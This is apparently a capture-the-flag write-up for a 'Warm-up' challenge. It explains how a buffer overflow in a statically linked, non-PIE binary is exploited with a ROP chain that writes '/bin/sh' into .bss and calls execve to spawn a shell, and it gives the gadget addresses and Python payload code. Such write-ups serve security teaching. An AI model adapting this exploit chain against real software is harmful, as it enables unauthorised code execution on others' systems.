# Warm-up (THEM-CTF-2026) 

## Challenge Overview  
- We use checksec to overview the binary 
- <img src="images/check-sec.png" width="600"><br>
-> we see that `NO PIE`, so address of any function or command in assembly is fixed; And it's the reason we use ROP technique<br>
- Our goal: Executing `system("/bin/sh")` to spawn shell 

## Static Analysis 
- We try to put some different inputs, and we see that we can put a very long input into the buffer -> it's the vulnerability 
- <img src="images/test-input.png" width="600">
- Next, we will use IDA to analyze the diassembly of this binary
- <img src="images/ida-main.png" width="600"> : 
    - We note that some function like `puts` named as `IO_puts`, we should check again this binary 
    - > warm_up: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=763c6a95796cda2157403a14c7c0aaaa80da3d75, for GNU/Linux 3.2.0, not stripped
    - It means that all function are inside the binary, and we have their addresses 
- Inside `main`, there's `vuln` function called 
- <img src="images/ida-main.png" width="600"> : 
    - `__libc_read` is called with limit is `0x120` bytes -> The input we can put is very long 
- <img src="images/ida-main.png" width="600"> :
    - See that decompiled C-code, there are some conditions of our input, note this 

## Process Of Spawning Shell 
- First, we want to know how the ROP works, you can go to [Return-Oriented Programming – Ret2Win (ROP Emporium)](https://chihuyenichi.github.io/huyenchi-blog/post/return-oriented-programming) to understand this technique 
- We need to file all address of `pop rdi; ret`, string `/bin/sh`, `syscall, ret`, `system, ret`; We will use ROPgadget Tool `ROPgadget --binary warm-up > gadgets.txt`
-  
    ```py
    syscall_ret  = p64(0x44ebd9)        # syscall; ret
    pop_rdi      = p64(0x401f9f)        # pop rdi; ret
    ```
- I can't find the string `/bin/sh`; So we should think about initializing this string in `.bss` (Block Started by Symbol)
    - We can understand `.bss` section as where save statically allocated variables

### Overwriting string `/bin/sh` to `.bss` section 
- We need to determine something required for overwrite : 
    - `.bss` entry address : It's where we write our expected string
    - `pop rax`, `pop rdi`, `pop rsi`, `pop rdx` : we need all of them as the parameter of `read` function 
    - `syscall; ret` : Running command 
- Note that the `payload` (our input) must have length smaller than `0x120` 
- 

- All addresses we can find from gadgets got above  
    ```py
    syscall_ret  = p64(0x44ebd9)        # syscall; ret
    xor_eax_ret  = p64(0x40240e)        # xor eax, eax; ret
    pop_rax      = p64(0x44ffc7)        # pop rax; ret
    pop_rdi      = p64(0x401f9f)        # pop rdi; ret
    pop_rsi      = p64(0x40a00e)        # pop rsi; ret
    pop_rdx_rbx  = p64(0x485d2b)        # pop rdx; pop rbx; ret
    bss_addr     = p64(0x4c72b0)

    payload  = b"A" * (0x80 + 0x8)

    # read(0, bss, 8)
    payload += xor_eax_ret              # rax = 0  (SYS_read)
    payload += pop_rdi + p64(0)         # rdi = 0  (stdin)
    payload += pop_rsi + bss_addr       # rsi = bss
    payload += pop_rdx_rbx + p64(8) + p64(0)
    payload += syscall_ret
    ```
- With this payload, when the binary run, we only need to put the string `/bin/sh` 

### Finishing ROP Chain 
- We do the remaining executing as follows  
    ```py
    # execve(bss, 0, 0)
    payload += pop_rax + p64(59)        # rax = 59 (SYS_execve)
    payload += pop_rdi + bss_addr       # rdi = bss
    payload += pop_rsi + p64(0)         # rsi = 0  (argv = NULL)
    payload += pop_rdx_rbx + p64(0) + p64(0)
    payload += syscall_ret
    ```

